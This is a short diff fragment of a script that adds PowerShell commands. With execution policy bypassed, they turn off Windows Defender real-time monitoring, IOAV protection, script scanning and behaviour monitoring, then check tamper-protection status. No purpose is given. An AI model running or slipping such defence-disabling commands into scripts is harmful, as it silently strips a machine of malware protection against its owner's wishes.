@@ -1,3 +1,6 @@
+start windowsdefender:
+powershell -NoP -Ep Bypass -C "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
+powershell -NoP -C "Get-MpComputerStatus | fl IsTamperProtected,RealTimeProtectionEnabled"
 
 powershell -NoP -C "Get-MpComputerStatus | fl RealTimeProtectionEnabled,IsTamperProtected,AMRunningMode,AntispywareEnabled"
 
